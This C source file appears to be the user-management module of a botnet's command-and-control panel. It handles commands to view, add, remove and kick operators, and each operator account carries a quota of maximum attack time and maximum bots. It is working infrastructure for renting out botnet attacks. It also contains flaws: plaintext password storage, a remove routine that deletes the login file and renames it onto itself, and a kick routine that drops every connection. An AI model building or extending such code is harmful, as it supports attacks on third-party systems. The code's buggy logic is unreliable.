#include "headers/command_actions.h"
#include "headers/botnet.h"
#include "headers/user_handler.h"
#include "headers/checks.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void handle_user_command(const User *user, const char *command, char *response) {
    if (!user->is_admin) {
        FILE *sf = fopen("database/settings.txt", "r");
        int allow_non_admin = 0;
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalusercommand:", 17) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Only admins can use !user command\r\n" RESET);
            return;
        }
    }
    
    char target_user[50] = {0};
    if (sscanf(command, "!user %49s", target_user) == 1) {
        int found = 0;
        for (int i = 0; i < user_count; i++) {
            if (strcmp(users[i].user, target_user) == 0) {
                snprintf(response, MAX_COMMAND_LENGTH,
                    BLUE "Username: %s\r\n"
                    "Max time: %d\r\n"
                    "Max bots: %d\r\n"
                    "Admin: %s\r\n"
                    "Connected: %s\r\n" RESET,
                    users[i].user,
                    users[i].maxtime,
                    users[i].maxbots,
                    users[i].is_admin ? "yes" : "no",
                    users[i].is_logged_in ? "yes" : "no");
                found = 1;
                break;
            }
        }
        if (!found) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "User not found\r\n" RESET);
        }
    } else {
        snprintf(response, MAX_COMMAND_LENGTH,
            BLUE "Username: %s\r\n"
            "Max time: %d\r\n"
            "Max bots: %d\r\n"
            "Admin: %s\r\n"
            "Connected: yes\r\n" RESET,
            user->user,
            user->maxtime,
            user->maxbots,
            user->is_admin ? "yes" : "no");
    }
}

void handle_adduser_command(const User *user, int client_socket) {
    static char response[MAX_COMMAND_LENGTH];
    static char buffer[128];
    static char newuser[50];
    static char newpass[50];
    static char rootuser[50];
    static int maxtime, maxbots, is_admin;
    static int is_root;
    static ssize_t len;
    
    memset(newuser, 0, sizeof(newuser));
    memset(newpass, 0, sizeof(newpass));
    memset(rootuser, 0, sizeof(rootuser));
    is_root = 0;
    
    FILE *sf = fopen("database/settings.txt", "r");
    if (sf) {
        char line[128];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "rootuser:", 9) == 0) {
                sscanf(line + 9, " %49s", rootuser);
                if (strcmp(user->user, rootuser) == 0) {
                    is_root = 1;
                }
                break;
            }
        }
        fclose(sf);
    }

    if (!is_root) {
        snprintf(response, sizeof(response), RED "Only root user can add users\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    snprintf(response, sizeof(response), BLUE "Username: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    
    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
    buffer[len] = 0;

    int uidx = 0;
    for (int i = 0; i < len && uidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || 
            (c >= '0' && c <= '9') || c == '_') {
            newuser[uidx++] = c;
        }
    }
    newuser[uidx] = 0;

    if (strlen(newuser) < 3) {
        snprintf(response, sizeof(response), RED "Username must be at least 3 characters (letters, numbers, underscore)\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, newuser) == 0) {
            snprintf(response, sizeof(response), RED "User already exists\r\n" RESET);
            send(client_socket, response, strlen(response), MSG_NOSIGNAL);
            return;
        }
    }

    snprintf(response, sizeof(response), BLUE "Password: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    
    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
    buffer[len] = 0;

    int pidx = 0;
    for (int i = 0; i < len && pidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if (c >= 32 && c <= 126) {  // avoids code injections like \x90 etc
            newpass[pidx++] = c;
        }
    }
    newpass[pidx] = 0;

    if (strlen(newpass) < 4) {
        snprintf(response, sizeof(response), RED "Password must be at least 4 characters\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    snprintf(response, sizeof(response), BLUE "Admin (y/n): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    
    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
    buffer[len] = 0;

    char c;
    for (int i = 0; i < len; i++) {
        c = buffer[i];
        if (c == 'y' || c == 'Y' || c == 'n' || c == 'N') {
            is_admin = (c == 'y' || c == 'Y') ? 1 : 0;
            break;
        }
    }

    snprintf(response, sizeof(response), BLUE "Max attack time (seconds): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    
    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
    buffer[len] = 0;
    buffer[strcspn(buffer, "\r\n")] = 0;
    
    if (sscanf(buffer, "%d", &maxtime) != 1 || maxtime <= 0) {
        snprintf(response, sizeof(response), RED "Invalid max time value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    // fix flows
    snprintf(response, sizeof(response), BLUE "Max bots: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    
    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
    buffer[len] = 0;
    buffer[strcspn(buffer, "\r\n")] = 0;
    
    if (sscanf(buffer, "%d", &maxbots) != 1 || maxbots <= 0) {
        snprintf(response, sizeof(response), RED "Invalid max bots value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    FILE *fp = fopen("database/logins.txt", "a");
    if (!fp) {
        snprintf(response, sizeof(response), RED "Error: Could not open user database\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    
    fprintf(fp, "%s %s %d %d %s\n", newuser, newpass, maxtime, maxbots, is_admin ? "admin" : "0");
    fclose(fp);

    if (user_count < MAX_USERS) {
        strncpy(users[user_count].user, newuser, sizeof(users[user_count].user)-1);
        users[user_count].user[sizeof(users[user_count].user)-1] = 0;
        strncpy(users[user_count].pass, newpass, sizeof(users[user_count].pass)-1);
        users[user_count].pass[sizeof(users[user_count].pass)-1] = 0;
        users[user_count].maxtime = maxtime;
        users[user_count].maxbots = maxbots;
        users[user_count].is_admin = is_admin;
        users[user_count].is_logged_in = 0;
        user_count++;
    }

    snprintf(response, sizeof(response), 
        BLUE "User added successfully:\r\n"
        "Username: %s\r\n"
        "Max time: %d\r\n"
        "Max bots: %d\r\n"
        "Admin: %s\r\n" RESET,
        newuser, maxtime, maxbots, is_admin ? "yes" : "no");
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
}

void handle_removeuser_command(const User *user, const char *command, char *response) {
    FILE *sf = fopen("database/settings.txt", "r");
    char rootuser[50] = {0};
    int is_root = 0;
    
    if (sf) {
        char line[128];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "rootuser:", 9) == 0) {
                sscanf(line + 9, " %49s", rootuser);
                if (strcmp(user->user, rootuser) == 0) {
                    is_root = 1;
                }
                break;
            }
        }
        fclose(sf);
    }

    if (!is_root) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Only root user can remove users\r\n" RESET);
        return;
    }    char target[50];
    if (sscanf(command, "!removeuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: !removeuser <username>\r\n" RESET);
        return;
    }

    if (strcmp(target, rootuser) == 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Cannot remove root user\r\n" RESET);
        return;
    }

    FILE *f = fopen("database/logins.txt", "r");
    FILE *temp = fopen("database/logins.tmp", "w");
    if (!f || !temp) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Failed to remove user\r\n" RESET);
        if (f) fclose(f);
        if (temp) fclose(temp);
        return;
    }

    char line[256];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char current[50];
        if (sscanf(line, "%49s", current) == 1) {
            if (strcmp(current, target) != 0) {
                fputs(line, temp);
            } else {
                found = 1;
            }
        }
    }

    fclose(f);
    fclose(temp);

    if (found) {
        remove("database/logins.txt");
        rename("database/logins.txt", "database/logins.txt");
        load_users();
        snprintf(response, MAX_COMMAND_LENGTH, GREEN "User %s removed\r\n" RESET, target);
    } else {
        remove("logins.tmp");
        snprintf(response, MAX_COMMAND_LENGTH, RED "User not found\r\n" RESET);
    }
}

void handle_kickuser_command(const User *user, const char *command, char *response) {
    static char target[50];
    static int allow_non_admin;
    static int found;
    
    if (!user->is_admin) {
        FILE *sf = fopen("database/settings.txt", "r");
        allow_non_admin = 0;
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Error: You need to be admin or have globalstopall enabled to kick users\r\n" RESET);
            return;
        }
    }

    if (sscanf(command, "!kickuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: !kickuser <username>\r\n" RESET);
        return;
    }

    found = 0;
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, target) == 0) {
            if (!users[i].is_logged_in) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "User not connected\r\n" RESET);
                return;
            }
            for (int j = 0; j < MAX_USERS; j++) {
                if (user_sockets[j] > 0) {
                    shutdown(user_sockets[j], SHUT_RDWR);
                    close(user_sockets[j]);
                    user_sockets[j] = 0;
                }
            }
            users[i].is_logged_in = 0;
            found = 1;
            break;
        }
    }

    if (found) {
        snprintf(response, MAX_COMMAND_LENGTH, GREEN "Kicked user %s\r\n" RESET, target);
    } else {
        snprintf(response, MAX_COMMAND_LENGTH, RED "User not found\r\n" RESET);
    }
}
